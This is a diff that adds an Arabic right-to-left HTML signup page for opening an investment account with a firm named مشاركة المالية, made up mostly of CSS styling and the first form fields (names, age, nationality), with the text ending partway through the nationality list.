@@ -1,0 +1,1943 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>فتح حساب استثماري | مشاركة المالية</title>
+  <meta name="keywords" content="فتح حساب استثماري, تداول أسهم, حساب وساطة, مشاركة المالية, سوق الأسهم السعودي, فتح حساب تداول, الأوراق المالية, تسجيل مستثمر">
+  <link rel="icon" href="../wp-content/uploads/2025/03/faviconV2.png" sizes="32x32">
+  <link rel="stylesheet" href="../wp-content/litespeed/css/a0062117fd9d72362afee7da555070cd.css">
+
+  <!-- Local Fonts -->
+  <style>
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-light.woff2') format('woff2');
+      font-weight: 300;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-regular.woff2') format('woff2');
+      font-weight: 400;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-medium.woff2') format('woff2');
+      font-weight: 500;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-bold.woff2') format('woff2');
+      font-weight: 700;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-extrabold.woff2') format('woff2');
+      font-weight: 800;
+      font-display: swap;
+    }
+  </style>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --gold:        #b5985a;
+      --gold-light:  #eed3a6;
+      --gold-dark:   #8c7340;
+      --dark:        #1a1a1a;
+      --dark-2:      #231f20;
+      --bg:          #f5f0e8;
+      --white:       #ffffff;
+      --text-muted:  #6c6c6c;
+      --border:      #ddd0b8;
+      --error:       #c0392b;
+      --success:     #1e8449;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Tajawal', sans-serif;
+      background-color: var(--dark-2);
+      color: var(--dark);
+      direction: rtl;
+    }
+
+    /* ========== LAYOUT ========== */
+    .page-wrapper {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* ---- ASIDE (image side) ---- */
+    .aside {
+      flex: 0 0 42%;
+      position: sticky;
+      top: 0;
+      height: 100vh;
+      background: var(--dark-2) url('../wp-content/uploads/2025/04/ad0dd98ee54f5c1cc0ad82aed29e0605.png') center/cover no-repeat;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 40px 30px;
+      overflow: hidden;
+    }
+
+    .aside::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(160deg, rgba(26,26,26,0.88) 0%, rgba(26,26,26,0.60) 50%, rgba(181,152,90,0.25) 100%);
+    }
+
+    .aside > * { position: relative; z-index: 1; }
+
+    .aside-logo img {
+      max-height: 80px;
+      filter: brightness(1.1);
+    }
+
+    .aside-text {
+      text-align: center;
+      color: var(--white);
+    }
+
+    .aside-text h2 {
+      font-size: 2rem;
+      font-weight: 800;
+      color: var(--gold-light);
+      line-height: 1.4;
+      margin-bottom: 14px;
+    }
+
+    .aside-text p {
+      font-size: 1rem;
+      font-weight: 300;
+      color: rgba(255,255,255,0.75);
+      line-height: 1.8;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .aside-footer {
+      text-align: center;
+      color: rgba(255,255,255,0.4);
+      font-size: 0.78rem;
+    }
+
+    .aside-footer p + p { margin-top: 6px; }
+
+    .aside-contact {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .aside-contact a {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.12);
+      color: #fff;
+      text-decoration: none;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      font-weight: 500;
+      transition: background 0.2s;
+    }
+
+    .aside-contact a:hover { background: rgba(255,255,255,0.22); }
+
+    .aside-contact a.wa { background: rgba(37,211,102,0.25); }
+    .aside-contact a.wa:hover { background: rgba(37,211,102,0.4); }
+
+    /* floating buttons on mobile */
+    .float-contact {
+      display: none;
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 999;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .float-contact a {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 1.3rem;
+      text-decoration: none;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.25);
+    }
+
+    .float-contact a.wa  { background: #25d366; }
+    .float-contact a.tel { background: var(--gold); }
+
+    @media (max-width: 768px) {
+      .float-contact { display: flex; }
+    }
+
+    /* ---- FORM SIDE ---- */
+    .form-side {
+      flex: 1;
+      background: var(--bg);
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .form-container {
+      max-width: 680px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 50px 40px 60px;
+    }
+
+    /* ---- HEADER ---- */
+    .form-header {
+      margin-bottom: 36px;
+    }
+
+    .form-header .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--gold);
+      text-decoration: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      margin-bottom: 24px;
+      transition: opacity 0.2s;
+    }
+    .form-header .back-link:hover { opacity: 0.75; }
+
+    .form-header h1 {
+      font-size: 1.9rem;
+      font-weight: 800;
+      color: var(--dark);
+      line-height: 1.3;
+    }
+
+    .form-header p {
+      margin-top: 8px;
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      font-weight: 400;
+    }
+
+    /* ---- PROGRESS STEPS ---- */
+    .progress-steps {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 36px;
+      align-items: center;
+    }
+
+    .step-bar {
+      height: 4px;
+      flex: 1;
+      border-radius: 100px;
+      background: var(--border);
+      transition: background 0.3s;
+    }
+    .step-bar.active { background: var(--gold); }
+
+    /* ---- SECTION DIVIDER ---- */
+    .section-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+      margin-top: 32px;
+    }
+
+    .section-title:first-of-type { margin-top: 0; }
+
+    .section-number {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--gold);
+      color: var(--white);
+      font-size: 0.85rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .section-title h2 {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: var(--dark);
+      flex: 1;
+    }
+
+    .section-line {
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* ---- FORM GRID ---- */
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .form-grid .full-width { grid-column: 1 / -1; }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    label {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--dark);
+    }
+
+    label .required { color: var(--gold); margin-right: 2px; }
+    label .optional {
+      font-weight: 400;
+      color: var(--text-muted);
+      font-size: 0.78rem;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"],
+    input[type="email"],
+    select,
+    textarea {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      background: var(--white);
+      font-family: 'Tajawal', sans-serif;
+      font-size: 0.95rem;
+      color: var(--dark);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      direction: rtl;
+    }
+
+    input[type="text"]:focus,
+    input[type="number"]:focus,
+    input[type="tel"]:focus,
+    input[type="email"]:focus,
+    select:focus,
+    textarea:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,0.15);
+    }
+
+    input.error, select.error, textarea.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(192,57,43,0.10);
+    }
+
+    .error-msg {
+      font-size: 0.78rem;
+      color: var(--error);
+      display: none;
+    }
+
+    input.error ~ .error-msg,
+    select.error ~ .error-msg,
+    textarea.error ~ .error-msg {
+      display: block;
+    }
+
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23b5985a' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: left 14px center;
+      padding-left: 40px;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 110px;
+    }
+
+    /* ---- PHONE FIELD ---- */
+    .phone-wrapper {
+      display: flex;
+      gap: 0;
+      position: relative;
+    }
+
+    .phone-wrapper input {
+      flex: 1;
+      border-radius: 0 10px 10px 0 !important;
+      border-right: none !important;
+    }
+
+    /* ---- CUSTOM DROPDOWN (shared: phone code + currency) ---- */
+    .custom-dropdown {
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .custom-dropdown-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 12px;
+      height: 100%;
+      min-height: 48px;
+      border: 1.5px solid var(--border);
+      border-left: none;
+      border-radius: 10px 0 0 10px;
+      background: #f0ebe0;
+      font-family: 'Tajawal', sans-serif;
+      font-size: 0.92rem;
+      color: var(--dark);
+      cursor: pointer;
+      white-space: nowrap;
+      user-select: none;
+      transition: background 0.2s, border-color 0.2s;
+      outline: none;
+    }
+
+    .custom-dropdown-btn:hover { background: #e8e0d0; }
+    .custom-dropdown-btn:focus { border-color: var(--gold); }
+
+    .custom-dropdown-btn .dd-flag  { font-size: 1.25rem; line-height: 1; }
+    .custom-dropdown-btn .dd-code  { font-weight: 600; letter-spacing: 0.3px; }
+    .custom-dropdown-btn .dd-arrow {
+      font-size: 0.65rem;
+      color: var(--gold);
+      margin-right: 2px;
+      transition: transform 0.2s;
+    }
+
+    .custom-dropdown.open .dd-arrow { transform: rotate(180deg); }
+
+    /* Panel — fixed so it escapes overflow:auto parents */
+    .custom-dropdown-panel {
+      display: none;
+      position: fixed;
+      width: 270px;
+      max-height: 320px;
+      background: var(--white);
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 12px 36px rgba(0,0,0,0.15);
+      z-index: 9999;
+      overflow: hidden;
+      flex-direction: column;
+    }
+
+    .custom-dropdown.open .custom-dropdown-panel { display: flex; }
+
+    .dd-search {
+      padding: 10px 12px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .dd-search input {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1.5px solid var(--border);
+      border-radius: 8px;
+      font-family: 'Tajawal', sans-serif;
+      font-size: 0.88rem;
+      outline: none;
+      direction: rtl;
+    }
+
+    .dd-search input:focus { border-color: var(--gold); }
+
+    .dd-list {
+      overflow-y: auto;
+      flex: 1;
+    }
+
+    .dd-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      cursor: pointer;
+      transition: background 0.15s;
+      font-family: 'Tajawal', sans-serif;
+      font-size: 0.9rem;
+    }
+
+    .dd-item:hover  { background: rgba(181,152,90,0.08); }
+    .dd-item.active { background: rgba(181,152,90,0.15); font-weight: 700; }
+
+    .dd-item .item-flag  { font-size: 1.2rem; flex-shrink: 0; }
+    .dd-item .item-name  { flex: 1; color: var(--dark); }
+    .dd-item .item-code  { color: var(--text-muted); font-size: 0.82rem; font-weight: 600; }
+
+    /* ---- CAPITAL FIELD ---- */
+    .capital-wrapper {
+      display: flex;
+      gap: 0;
+    }
+
+    .capital-wrapper input {
+      border-radius: 0 10px 10px 0 !important;
+      border-right: none !important;
+    }
+
+    /* Currency dropdown btn — right side */
+    .capital-wrapper .custom-dropdown-btn {
+      border-radius: 10px 0 0 10px;
+      border-left: none;
+      border-right: 1.5px solid var(--border);
+      min-width: 110px;
+      justify-content: center;
+    }
+
+    .capital-wrapper .custom-dropdown-panel {
+      width: 240px;
+    }
+
+    /* Capital input — left-joined */
+    .capital-input {
+      border-radius: 0 10px 10px 0;
+      border-right: none;
+      border-left: 1.5px solid var(--border);
+    }
+
+    /* Offer error hidden by default */
+    .offer-error-hidden { display: none; }
+
+    /* Offer card spans as block */
+    .offer-card-label span { display: block; }
+
+    /* ---- OFFER TYPES ---- */
+    .offer-cards {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .offer-card {
+      position: relative;
+      cursor: pointer;
+    }
+
+    .offer-card input[type="radio"] {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .offer-card-label {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      padding: 16px 12px;
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      background: var(--white);
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: center;
+      width: 100%;
+    }
+
+    .offer-card-label:hover {
+      border-color: var(--gold-light);
+      background: rgba(238,211,166,0.15);
+    }
+
+    .offer-card input[type="radio"]:checked + .offer-card-label {
+      border-color: var(--gold);
+      background: rgba(181,152,90,0.08);
+      box-shadow: 0 0 0 3px rgba(181,152,90,0.15);
+    }
+
+    .offer-card-icon {
+      font-size: 1.8rem;
+      line-height: 1;
+    }
+
+    .offer-card-name {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--dark);
+    }
+
+    .offer-card-desc {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      line-height: 1.4;
+    }
+
+    /* ---- OFFER PACKAGES (detailed full-width cards) ---- */
+    .offer-packages-divider {
+      grid-column: 1 / -1;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 8px;
+    }
+
+    .offer-packages-divider span {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      white-space: nowrap;
+      font-weight: 500;
+    }
+
+    .offer-packages-divider::before,
+    .offer-packages-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .offer-package {
+      grid-column: 1 / -1;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .offer-package input[type="radio"] {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .offer-package-label {
+      display: block;
+      border: 2px solid var(--border);
+      border-radius: 16px;
+      background: var(--white);
+      cursor: pointer;
+      transition: all 0.22s;
+      overflow: hidden;
+    }
+
+    .offer-package-label:hover {
+      border-color: var(--gold-light);
+      box-shadow: 0 4px 18px rgba(181,152,90,0.12);
+    }
+
+    .offer-package input[type="radio"]:checked + .offer-package-label {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,0.18), 0 6px 24px rgba(181,152,90,0.14);
+    }
+
+    /* -- Gold variant -- */
+    .offer-package.gold .offer-package-label {
+      border-color: rgba(181,152,90,0.4);
+      background: linear-gradient(135deg, #fffbf4 0%, #fff8ed 100%);
+    }
+
+    .offer-package.gold .offer-package-label:hover {
+      border-color: var(--gold);
+      box-shadow: 0 4px 24px rgba(181,152,90,0.2);
+    }
+
+    .offer-package.gold input[type="radio"]:checked + .offer-package-label {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,0.25), 0 8px 30px rgba(181,152,90,0.2);
+    }
+
+    /* -- Package header -- */
+    .pkg-header {
+      padding: 18px 22px 14px;
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .offer-package.gold .pkg-header {
+      background: linear-gradient(90deg, rgba(181,152,90,0.08) 0%, rgba(238,211,166,0.1) 100%);
+    }
+
+    .pkg-header-info { flex: 1; }
+
+    .pkg-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 10px;
+      border-radius: 100px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .pkg-badge.normal {
+      background: rgba(100,120,150,0.1);
+      color: #445;
+    }
+
+    .pkg-badge.gold-badge {
+      background: linear-gradient(90deg, #b5985a, #eed3a6);
+      color: var(--dark);
+    }
+
+    .pkg-title {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: var(--dark);
+      margin-bottom: 4px;
+    }
+
+    .pkg-subtitle {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* Check mark indicator */
+    .pkg-check {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 4px;
+      transition: all 0.2s;
+      color: transparent;
+      font-size: 0.75rem;
+    }
+
+    .offer-package input[type="radio"]:checked + .offer-package-label .pkg-check {
+      background: var(--gold);
+      border-color: var(--gold);
+      color: var(--white);
+    }
+
+    /* -- Package stats grid -- */
+    .pkg-stats {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0;
+      padding: 0;
+    }
+
+    .pkg-stat {
+      padding: 14px 16px;
+      border-left: 1px solid var(--border);
+      text-align: center;
+    }
+
+    .pkg-stat:last-child { border-left: none; }
+
+    .pkg-stat-label {
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      font-weight: 500;
+      margin-bottom: 5px;
+    }
+
+    .pkg-stat-value {
+      font-size: 1rem;
+      font-weight: 800;
+      color: var(--dark);
+      line-height: 1.2;
+    }
+
+    .pkg-stat-value.highlight { color: var(--gold-dark); font-size: 1.2rem; }
+
+    /* -- Package footer -- */
+    .pkg-footer {
+      padding: 12px 22px;
+      border-top: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      flex-wrap: wrap;
+      background: rgba(0,0,0,0.015);
+    }
+
+    .offer-package.gold .pkg-footer {
+      background: rgba(181,152,90,0.04);
+    }
+
+    .pkg-range {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.82rem;
+    }
+
+    .pkg-range-item { display: flex; align-items: center; gap: 5px; }
+    .pkg-range-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--gold);
+      flex-shrink: 0;
+    }
+
+    .pkg-range-label { color: var(--text-muted); }
+    .pkg-range-val   { font-weight: 700; color: var(--dark); }
+    .pkg-range-sep   { color: var(--border); font-size: 1rem; }
+
+    .pkg-extra {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--gold-dark);
+    }
+
+    .pkg-extra-icon { font-size: 1rem; }
+
+    @media (max-width: 600px) {
+      .pkg-stats { grid-template-columns: repeat(2, 1fr); }
+      .pkg-stat:nth-child(2) { border-left: none; }
+      .pkg-stat:nth-child(3),
+      .pkg-stat:nth-child(4) { border-top: 1px solid var(--border); }
+      .pkg-header { flex-direction: column; gap: 10px; }
+      .pkg-check  { align-self: flex-end; margin-top: -30px; }
+    }
+
+    /* ---- SUBMIT BUTTON ---- */
+    .submit-section {
+      margin-top: 36px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 15px 24px;
+      background: var(--gold);
+      color: var(--white);
+      border: none;
+      border-radius: 12px;
+      font-family: 'Tajawal', sans-serif;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.25s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-submit:hover {
+      background: var(--gold-dark);
+      transform: translateY(-1px);
+      box-shadow: 0 6px 20px rgba(181,152,90,0.35);
+    }
+
+    .btn-submit:active { transform: translateY(0); }
+
+    .btn-submit svg {
+      transition: transform 0.2s;
+    }
+    .btn-submit:hover svg { transform: translateX(-4px); }
+
+    .btn-submit.loading {
+      opacity: 0.75;
+      pointer-events: none;
+      cursor: not-allowed;
+    }
+
+    .btn-submit .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    .btn-submit.loading .spinner     { display: block; }
+    .btn-submit.loading .btn-icon    { display: none; }
+    .btn-submit.loading .btn-label   { opacity: 0.85; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Error toast */
+    .toast-error {
+      display: none;
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #c0392b;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      z-index: 9999;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      white-space: nowrap;
+      animation: fadeUp 0.3s ease;
+    }
+
+    .toast-error.show { display: block; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+      to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    .terms-note {
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      line-height: 1.7;
+    }
+
+    .terms-note a { color: var(--gold); text-decoration: none; }
+    .terms-note a:hover { text-decoration: underline; }
+
+    /* ---- SUCCESS OVERLAY ---- */
+    .success-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(26,26,26,0.75);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .success-overlay.show { display: flex; }
+
+    .success-card {
+      background: var(--white);
+      border-radius: 20px;
+      padding: 50px 40px;
+      text-align: center;
+      max-width: 420px;
+      width: 90%;
+      animation: popIn 0.35s ease;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.85); opacity: 0; }
+      to   { transform: scale(1);    opacity: 1; }
+    }
+
+    .success-icon {
+      width: 72px;
+      height: 72px;
+      background: rgba(30,132,73,0.1);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .success-icon svg { color: var(--success); }
+
+    .success-card h2 {
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--dark);
+      margin-bottom: 10px;
+    }
+
+    .success-card p {
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      line-height: 1.7;
+      margin-bottom: 28px;
+    }
+
+    .btn-back-home {
+      display: inline-block;
+      padding: 12px 32px;
+      background: var(--gold);
+      color: var(--white);
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 0.95rem;
+      transition: background 0.2s;
+    }
+    .btn-back-home:hover { background: var(--gold-dark); }
+
+    /* ========== RESPONSIVE ========== */
+    @media (max-width: 900px) {
+      .aside { display: none; }
+      .form-side { background: var(--bg); }
+      .form-container { padding: 32px 24px 50px; }
+    }
+
+    @media (max-width: 600px) {
+      .form-grid { grid-template-columns: 1fr; }
+      .form-grid .full-width { grid-column: 1; }
+      .offer-cards { grid-template-columns: 1fr 1fr; }
+      .form-container { padding: 24px 16px 40px; }
+      .form-header h1 { font-size: 1.5rem; }
+    }
+
+    @media (max-width: 420px) {
+      .offer-cards { grid-template-columns: 1fr; }
+    }
+
+    /* ---- Input Number hide arrows ---- */
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+    input[type=number] { -moz-appearance: textfield; }
+
+    /* ---- Placeholder ---- */
+    ::placeholder { color: #bbb; font-size: 0.9rem; }
+  </style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     SUCCESS OVERLAY
+============================================================ -->
+<!-- Toast error -->
+<div class="toast-error" id="toastError">⚠️ حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى</div>
+
+<!-- Success overlay -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-card">
+    <div class="success-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" viewBox="0 0 16 16">
+        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+      </svg>
+    </div>
+    <h2>شكراً لك! 🎉</h2>
+    <p>
+      تم استلام طلبك بنجاح.<br>
+      <strong>سيتم التواصل معك من أجل تسجيل حسابك في الشركة.</strong><br><br>
+      نقدّر ثقتك في مشاركة المالية ونتطلع إلى خدمتك.
+    </p>
+    <a href="index.htm" class="btn-back-home">العودة إلى الرئيسية</a>
+  </div>
+</div>
+
+
+<!-- ============================================================
+     PAGE WRAPPER
+============================================================ -->
+<div class="page-wrapper">
+
+  <!-- ---- ASIDE ---- -->
+  <aside class="aside">
+    <div class="aside-logo">
+      <a href="index.htm">
+        <img src="https://musharaka.space//wp-content/uploads/2025/04/ad0dd98ee54f5c1cc0ad82aed29e0605.png"
+             onerror="this.style.display='none'"
+             alt="مشاركة المالية">
+      </a>
+    </div>
+
+    <div class="aside-text">
+      <h2>شراكة كلّها ثقة</h2>
+      <p>
+        انضم إلى آلاف المستثمرين الذين وثقوا بمشاركة المالية لإدارة أصولهم وتنمية استثماراتهم في السوق السعودية.
+      </p>
+    </div>
+
+    <div class="aside-contact">
+      <a href="https://wa.me/966582062882" class="wa" target="_blank" title="واتساب">
+        <i class="fa-brands fa-whatsapp"></i> واتساب
+      </a>
+      <a href="tel:+966582062882" class="tel" title="اتصال هاتفي">
+        <i class="fa-solid fa-phone-volume"></i> اتصال
+      </a>
+    </div>
+    <div class="aside-footer">
+      <p>مرخّصة من هيئة السوق المالية · ترخيص رقم 2051056409</p>
+      <p>© 2025 مشاركة المالية. جميع الحقوق محفوظة.</p>
+    </div>
+  </aside>
+
+  <!-- floating contact buttons (mobile) -->
+  <div class="float-contact">
+    <a href="https://wa.me/966582062882" class="wa" target="_blank" title="واتساب">
+      <i class="fa-brands fa-whatsapp" aria-hidden="true"></i>
+      <span class="sr-only">واتساب</span>
+    </a>
+    <a href="tel:+966582062882" class="tel" title="اتصال هاتفي">
+      <i class="fa-solid fa-phone-volume" aria-hidden="true"></i>
+      <span class="sr-only">اتصال&nbsp;هاتفي</span>
+    </a>
+  </div>
+
+  <!-- ---- FORM SIDE ---- -->
+  <main class="form-side">
+    <div class="form-container">
+
+      <!-- Back Link -->
+      <div class="form-header">
+        <a href="index.htm" class="back-link">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd" d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"/>
+          </svg>
+          العودة للرئيسية
+        </a>
+        <h1>فتح حساب استثماري</h1>
+        <p>أكمل البيانات التالية وسيتواصل معك فريقنا في أقرب وقت</p>
+      </div>
+
+      <!-- Progress -->
+      <div class="progress-steps">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+      </div>
+
+      <!-- ======== FORM ======== -->
+      <form id="accountForm" novalidate>
+
+        <!-- ── SECTION 1: البيانات الشخصية ── -->
+        <div class="section-title">
+          <div class="section-number">١</div>
+          <h2>البيانات الشخصية</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group">
+            <label for="firstName">الاسم الأول <span class="required">*</span></label>
+            <input type="text" id="firstName" name="firstName" placeholder="أدخل الاسم الأول" required>
+            <span class="error-msg">هذا الحقل مطلوب</span>
+          </div>
+
+          <div class="form-group">
+            <label for="secondName">الاسم الثاني <span class="required">*</span></label>
+            <input type="text" id="secondName" name="secondName" placeholder="أدخل الاسم الثاني" required>
+            <span class="error-msg">هذا الحقل مطلوب</span>
+          </div>
+
+          <div class="form-group">
+            <label for="thirdName">الاسم الثالث <span class="required">*</span></label>
+            <input type="text" id="thirdName" name="thirdName" placeholder="أدخل الاسم الثالث" required>
+            <span class="error-msg">هذا الحقل مطلوب</span>
+          </div>
+
+          <div class="form-group">
+            <label for="age">العمر <span class="required">*</span></label>
+            <input type="number" id="age" name="age" placeholder="أدخل عمرك" min="18" max="100" required>
+            <span class="error-msg" id="ageError">يجب أن يكون العمر 18 سنة أو أكثر</span>
+          </div>
+
+          <div class="form-group full-width">
+            <label for="nationality">الجنسية <span class="required">*</span></label>
+            <select id="nationality" name="nationality" required>
+              <option value="" disabled selected>أدخل جنسيتك</option>
+              <option value="SA">سعودي</option>
+              <option value="AE">إماراتي</option>
+              <option value="KW">كويتي</option>
+              <option value="QA">قطري</option>
+              <option value="BH">بحريني</option>
+              <option value="OM">عُماني</option>
+              <option value="EG">مصري</option>
+              <option value="JO">أردني</option>
+              <option value="SY">سوري</option>
+              <option value="LB">لبناني</option>
+              <option value="IQ">عراقي</option>
+              <option value="YE">يمني</option>
+              <option value="LY">ليبي</option>
+              <option value="TN">تونسي</option>
+              <option value="DZ">جزائري</option>
+              <option value="MA">مغربي</option>
+              <option value="OTHER">أخرى</option>
+            </select>
